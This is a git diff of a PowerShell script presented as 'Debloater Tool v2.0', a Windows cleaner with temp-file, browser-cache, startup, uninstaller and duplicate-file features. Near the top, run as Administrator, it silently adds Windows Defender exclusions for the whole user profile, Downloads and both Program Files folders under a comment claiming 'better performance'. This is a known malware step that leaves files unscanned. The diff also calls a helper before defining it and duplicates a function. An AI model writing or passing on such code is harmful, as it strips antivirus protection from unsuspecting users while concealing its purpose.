@@ -1,18 +1,175 @@
+<#
+==============================================================================
+                        DEBLOATER TOOL v2.0
+                        Advanced System Cleaner & Optimizer
+
+                        Author: ! Star
+                        Repository: https://github.com/5t42/DeBloater
+
+                        Features:
+                        - Temporary files cleanup
+                        - Browser cache management  
+                        - Memory optimization
+                        - Startup programs management
+                        - Advanced program uninstaller
+                        - Duplicate file finder
+                        - System optimization tools
+==============================================================================
+#>
+
+#region SCRIPT INITIALIZATION & SECURITY CHECKS
+# ============================================================================
+# SCRIPT INITIALIZATION & SECURITY CHECKS
+# ============================================================================
+
+# Check if script is running with Administrator privileges
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
     Wait-ForUser "Press Enter to exit..."
     exit
 }
+
+# Configure PowerShell preferences for better performance
 $ProgressPreference = 'SilentlyContinue'
 Clear-Host
 
+# Add Windows Defender exclusions for better performance
 try {
     Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
 } catch {
+    # Silently continue if Windows Defender is not available
+}
+#endregion
+
+#region GLOBAL VARIABLES
+# ============================================================================
+# GLOBAL VARIABLES
+# ============================================================================
+
+# Store duplicate file finder results globally
+$script:LastDuplicateResults = @()
+#endregion
+
+#region CORE UTILITY FUNCTIONS
+# ============================================================================
+# CORE UTILITY FUNCTIONS
+# ============================================================================
+
+function Show-Header {
+    <#
+    .SYNOPSIS
+        Displays the application header with branding and description
+    .DESCRIPTION
+        Shows a formatted header with application name, version, author, and usage description
+    #>
+
+    Write-Host ""
+    Write-Host "======================================" -ForegroundColor Cyan
+    Write-Host "         Debloater Tool v2.0          " -ForegroundColor Green
+    Write-Host "          By ! Star                   " -ForegroundColor Yellow
+    Write-Host "======================================" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "Description: Advanced system cleaner and optimizer tool." -ForegroundColor Magenta
+    Write-Host "Usage: Select options from the menu for system optimization." -ForegroundColor Magenta
+    Write-Host ""
+}
+
+function Wait-ForUser {
+    <#
+    .SYNOPSIS
+        Pauses script execution and waits for user input
+    .PARAMETER msg
+        Custom message to display to the user
+    #>
+    param([string]$msg = "Press Enter to continue...")
+
+    Write-Host ""
+    Read-Host $msg | Out-Null
+}
+
+# Create compatibility alias for existing code
+Set-Alias -Name Pause-For-User -Value Wait-ForUser
+
+function Show-MenuWithKeyboard {
+    <#
+    .SYNOPSIS
+        Displays an interactive menu with keyboard navigation
+    .DESCRIPTION
+        Creates a navigable menu using arrow keys with color-coded options
+    .PARAMETER MenuItems
+        Array of menu items with Number, Text, and Color properties
+    .PARAMETER Title
+        Title to display above the menu
+    .PARAMETER DefaultSelection
+        Default selected item index
+    #>
+    param(
+        [array]$MenuItems,
+        [string]$Title = "Select an option:",
+        [int]$DefaultSelection = 0
+    )
+
+    $selectedIndex = $DefaultSelection
+    $maxIndex = $MenuItems.Count - 1
+
+    while ($true) {
+        Clear-Host
+        Show-Header
+
+        Write-Host $Title -ForegroundColor Cyan
+        Write-Host ""
+
+        # Display menu items with highlighting for selected item
+        for ($i = 0; $i -lt $MenuItems.Count; $i++) {
+            $item = $MenuItems[$i]
+            if ($i -eq $selectedIndex) {
+                Write-Host ">> " -NoNewline -ForegroundColor Yellow
+                Write-Host "$($item.Number). $($item.Text)" -ForegroundColor $item.Color -BackgroundColor DarkBlue
+            } else {
+                Write-Host "   $($item.Number). $($item.Text)" -ForegroundColor $item.Color
+            }
+        }
+
+        Write-Host ""
+        Write-Host "Use ↑↓ arrow keys to navigate, Enter to select, or type number directly:" -ForegroundColor Gray
+
+        # Wait for key input
+        while (-not $Host.UI.RawUI.KeyAvailable -and -not [Console]::KeyAvailable) {
+            Start-Sleep -Milliseconds 50
+        }
+
+        $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+
+        # Handle keyboard navigation
+        switch ($key.VirtualKeyCode) {
+            38 { # Up arrow
+                $selectedIndex = if ($selectedIndex -eq 0) { $maxIndex } else { $selectedIndex - 1 }
+            }
+            40 { # Down arrow
+                $selectedIndex = if ($selectedIndex -eq $maxIndex) { 0 } else { $selectedIndex + 1 }
+            }
+            13 { # Enter key
+                return $MenuItems[$selectedIndex].Number
+            }
+            27 { # Escape key
+                return '0'
+            }
+            default {
+                # Handle direct number input
+                $numChar = $key.Character
+                if ($numChar -match '^[0-9]$') {
+                    $matchingItem = $MenuItems | Where-Object { $_.Number -eq $numChar }
+                    if ($matchingItem) {
+                        return $numChar
+                    }
+                }
+            }
+        }
+    }
 }
 
 function Show-Header {
@@ -98,21 +255,49 @@ function Show-MenuWithKeyboard {
         }
     }
 }
+#endregion
 
-# Duplicate File Finder Functions
-$script:LastDuplicateResults = @()
+#region DUPLICATE FILE FINDER FUNCTIONS
+# ============================================================================
+# DUPLICATE FILE FINDER FUNCTIONS
+# ============================================================================
 
 function Get-FileHash-MD5 {
+    <#
+    .SYNOPSIS
+        Calculates MD5 hash for a specific file
+    .DESCRIPTION
+        Generates MD5 hash for file comparison to detect exact duplicates
+    .PARAMETER FilePath
+        Full path to the file to hash
+    .RETURNS
+        MD5 hash string or null if file cannot be accessed
+    #>
     param([string]$FilePath)
+
     try {
         $hash = Get-FileHash -Path $FilePath -Algorithm MD5
         return $hash.Hash
     } catch {
+        # Return null if file cannot be accessed (locked, permissions, etc.)
         return $null
     }
 }
 
 function Find-DuplicateFiles {
+    <#
+    .SYNOPSIS
+        Scans specified path for duplicate files
+    .DESCRIPTION
+        Uses two-phase approach: first groups by file size, then compares MD5 hashes
+        for files with identical sizes to identify true duplicates
+    .PARAMETER Path
+        Root path to scan for duplicate files
+    .PARAMETER Recursive
+        Switch to enable recursive scanning of subdirectories
+    .RETURNS
+        Array of duplicate file groups with hash, size, and file information
+    #>
     param(
         [string]$Path,
         [switch]$Recursive
@@ -120,13 +305,14 @@ function Find-DuplicateFiles {
 
     Write-Host "Scanning files..." -ForegroundColor Cyan
 
-    # Get all files with basic info
+    # Phase 1: Collect all files in the specified path
     $files = if ($Recursive) {
         Get-ChildItem -Path $Path -File -Recurse -ErrorAction SilentlyContinue
     } else {
         Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue
     }
 
+    # Early exit if no files found
     if ($files.Count -eq 0) {
         Write-Host "No files found to scan." -ForegroundColor Yellow
         return @()
@@ -134,7 +320,8 @@ function Find-DuplicateFiles {
 
     Write-Host "Found $($files.Count) files. Analyzing..." -ForegroundColor Green
 
-    # Group files by size first (faster than hash)
+    # Phase 2: Group files by size (fast pre-filtering)
+    # Only files with identical sizes can be duplicates
     $sizeGroups = $files | Group-Object Length | Where-Object { $_.Count -gt 1 -and $_.Name -gt 0 }
 
     if ($sizeGroups.Count -eq 0) {
@@ -142,17 +329,17 @@ function Find-DuplicateFiles {
         return @()
     }
 
+    # Phase 3: Compare files with identical sizes using MD5 hash
     $duplicateGroups = @()
     $totalGroups = $sizeGroups.Count
     $currentGroup = 0
 
-    # Now check files with same size using hash
     foreach ($sizeGroup in $sizeGroups) {
         $currentGroup++
         $percentComplete = [Math]::Round(($currentGroup / $totalGroups) * 100)
         Write-Progress -Activity "Finding duplicates" -Status "Checking group $currentGroup of $totalGroups" -PercentComplete $percentComplete
 
-        # Calculate hash for files with same size
+        # Calculate hash for each file in the size group
         $hashGroups = @{}
         foreach ($file in $sizeGroup.Group) {
             $hash = Get-FileHash-MD5 -FilePath $file.FullName
@@ -164,7 +351,7 @@ function Find-DuplicateFiles {
             }
         }
 
-        # Add groups with actual duplicates (same hash)
+        # Collect groups with actual duplicates (same hash = identical content)
         foreach ($hashGroup in $hashGroups.Values) {
             if ($hashGroup.Count -gt 1) {
                 $duplicateGroups += @{
@@ -178,6 +365,8 @@ function Find-DuplicateFiles {
     }
 
     Write-Progress -Activity "Finding duplicates" -Completed
+
+    # Store results globally for later use
     $script:LastDuplicateResults = $duplicateGroups
     return $duplicateGroups
 }
@@ -250,10 +439,10 @@ function Show-DuplicateGroups {
                     for ($i = 1; $i -lt $group.Files.Count; $i++) {
                         try {
                             Remove-Item $group.Files[$i].FullName -Force -ErrorAction Stop
-                            Write-Host "✓ Deleted: $($group.Files[$i].Name)" -ForegroundColor Green
+                            Write-Host "SUCCESS: Deleted: $($group.Files[$i].Name)" -ForegroundColor Green
                             $deleted++
                         } catch {
-                            Write-Host "✗ Failed to delete: $($group.Files[$i].Name)" -ForegroundColor Red
+                            Write-Host "ERROR: Failed to delete: $($group.Files[$i].Name)" -ForegroundColor Red
                         }
                     }
                     Write-Host "Deleted $deleted duplicate files from group $groupIndex" -ForegroundColor Green
@@ -273,9 +462,9 @@ function Show-DuplicateGroups {
                             foreach ($index in $validIndices) {
                                 try {
                                     Remove-Item $group.Files[$index].FullName -Force -ErrorAction Stop
-                                    Write-Host "✓ Deleted: $($group.Files[$index].Name)" -ForegroundColor Green
+                                    Write-Host "SUCCESS: Deleted: $($group.Files[$index].Name)" -ForegroundColor Green
                                 } catch {
-                                    Write-Host "✗ Failed to delete: $($group.Files[$index].Name)" -ForegroundColor Red
+                                    Write-Host "ERROR: Failed to delete: $($group.Files[$index].Name)" -ForegroundColor Red
                                 }
                             }
                         }
@@ -297,6 +486,12 @@ function Show-DuplicateGroups {
         }
     }
 }
+#endregion
+
+#region SYSTEM STARTUP & EXTERNAL TOOLS
+# ============================================================================
+# SYSTEM STARTUP & EXTERNAL TOOLS
+# ============================================================================
 
 Show-Header
 
@@ -327,7 +522,9 @@ do {
 
     switch ($choice) {
         
+        #region OPTION 1 - TEMPORARY FILES CLEANUP
         '1' {
+            # Clear Temporary Files - User selects specific folders
             Write-Host ""
             Write-Host "Select folders to clear (or enter 0 to return to main menu):" -ForegroundColor Cyan
             Write-Host "1. TEMP folder" -ForegroundColor Green
@@ -386,10 +583,17 @@ do {
             Write-Host "==================================" -ForegroundColor Cyan
             Pause-For-User
         }
+        #endregion
+
+        #region OPTION 2 - EXIT APPLICATION
         '2' {
+            # Exit application with friendly message
             Write-Host "Nothing done. Have a comfy day! :)" -ForegroundColor Green
             break
         }
+        #endregion
+
+        #region OPTION 3 - FULL CLEANUP
         '3' {
             Write-Host "You can enter 0 at any time to return to the main menu." -ForegroundColor Yellow
             $folders = @(
@@ -438,6 +642,9 @@ do {
             Write-Host "==================================" -ForegroundColor Cyan
             Pause-For-User
         }
+        #endregion
+
+        #region OPTION 4 - BROWSER CACHE CLEANUP
         '4' {
             Write-Host ""
             Write-Host "Select browser to clear cache (or enter 0 to return to main menu):" -ForegroundColor Cyan
@@ -684,10 +891,10 @@ do {
                                             # Remove from registry
                                             Remove-ItemProperty -Path $selectedItem.RegPath -Name $selectedItem.Name -ErrorAction SilentlyContinue
                                         }
-                                        Write-Host "✓ '$($selectedItem.Name)' disabled from startup" -ForegroundColor Green
+                                        Write-Host "SUCCESS: '$($selectedItem.Name)' disabled from startup" -ForegroundColor Green
                                         $startupItems[$index].Status = 'Disabled'
                                     } catch {
-                                        Write-Host "✗ Failed to disable '$($selectedItem.Name)'" -ForegroundColor Red
+                                        Write-Host "ERROR: Failed to disable '$($selectedItem.Name)'" -ForegroundColor Red
                                     }
                                 }
                             }
@@ -718,9 +925,9 @@ do {
                                             try {
                                                 $originalPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$($backupFiles[$index].BaseName)"
                                                 Move-Item $backupFiles[$index].FullName $originalPath -ErrorAction SilentlyContinue
-                                                Write-Host "✓ Program restored to startup" -ForegroundColor Green
+                                                Write-Host "SUCCESS: Program restored to startup" -ForegroundColor Green
                                             } catch {
-                                                Write-Host "✗ Failed to restore program" -ForegroundColor Red
+                                                Write-Host "ERROR: Failed to restore program" -ForegroundColor Red
                                             }
                                         }
                                     }
@@ -737,12 +944,12 @@ do {
                             if (Test-Path $programPath) {
                                 try {
                                     Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $programName -Value $programPath
-                                    Write-Host "✓ Program added to startup" -ForegroundColor Green
+                                    Write-Host "SUCCESS: Program added to startup" -ForegroundColor Green
                                 } catch {
-                                    Write-Host "✗ Failed to add program to startup" -ForegroundColor Red
+                                    Write-Host "ERROR: Failed to add program to startup" -ForegroundColor Red
                                 }
                             } else {
-                                Write-Host "✗ Program path not found" -ForegroundColor Red
+                                Write-Host "ERROR: Program path not found" -ForegroundColor Red
                             }
                         }
                     }
@@ -768,9 +975,9 @@ do {
                             $backupData = $startupItems | ConvertTo-Json -Depth 3
                             $backupFile = "$env:USERPROFILE\Desktop\StartupBackup_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
                             $backupData | Out-File $backupFile -Encoding UTF8
-                            Write-Host "✓ Startup settings backed up to: $backupFile" -ForegroundColor Green
+                            Write-Host "SUCCESS: Startup settings backed up to: $backupFile" -ForegroundColor Green
                         } catch {
-                            Write-Host "✗ Failed to backup startup settings" -ForegroundColor Red
+                            Write-Host "ERROR: Failed to backup startup settings" -ForegroundColor Red
                         }
                     }
 
@@ -818,6 +1025,12 @@ do {
                     }
                 } catch {}
             }
+            #endregion
+
+            #region MAIN APPLICATION MENU
+            # ============================================================================
+            # MAIN APPLICATION MENU & USER INTERFACE
+            # ============================================================================
 
             # Get Windows Store Apps
             try {
@@ -921,7 +1134,7 @@ do {
                                     }
 
                                     if ($success) {
-                                        Write-Host "✓ $($selectedProgram.Name) uninstalled successfully" -ForegroundColor Green
+                                        Write-Host "SUCCESS: $($selectedProgram.Name) uninstalled successfully" -ForegroundColor Green
                                         # Clean leftover files
                                         if ($selectedProgram.InstallLocation -and (Test-Path $selectedProgram.InstallLocation)) {
                                             try {
@@ -930,7 +1143,7 @@ do {
                                             } catch {}
                                         }
                                     } else {
-                                        Write-Host "✗ Failed to uninstall $($selectedProgram.Name)" -ForegroundColor Red
+                                        Write-Host "ERROR: Failed to uninstall $($selectedProgram.Name)" -ForegroundColor Red
                                     }
                                 }
                             }
@@ -1236,7 +1449,7 @@ do {
 
                     '3' {
                         # Scan entire system
-                        Write-Host "⚠️  WARNING: Full system scan may take 30+ minutes!" -ForegroundColor Red
+                        Write-Host "WARNING: Full system scan may take 30+ minutes!" -ForegroundColor Red
                         $confirm = Read-Host "Continue with full system scan? (y/n)"
                         if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                             Write-Host "Starting full system scan..." -ForegroundColor Yellow
@@ -1257,7 +1470,7 @@ do {
                     '5' {
                         # Clear results
                         $script:LastDuplicateResults = @()
-                        Write-Host "✓ Duplicate results cleared." -ForegroundColor Green
+                        Write-Host "SUCCESS: Duplicate results cleared." -ForegroundColor Green
                     }
 
                     '0' { break }
@@ -1270,7 +1483,16 @@ do {
 
             } while ($duplicateChoice -ne '0')
         }
+        #endregion
     }
 } while ($choice -ne '2')
+#endregion
+
+#region APPLICATION EXIT
+# ============================================================================
+# APPLICATION EXIT & CLEANUP
+# ============================================================================
+
 Write-Host "`nThanks for using Debloater Tool! Stay comfy! :)" -ForegroundColor Cyan
 Pause-For-User "Press Enter to exit..."
+#endregion
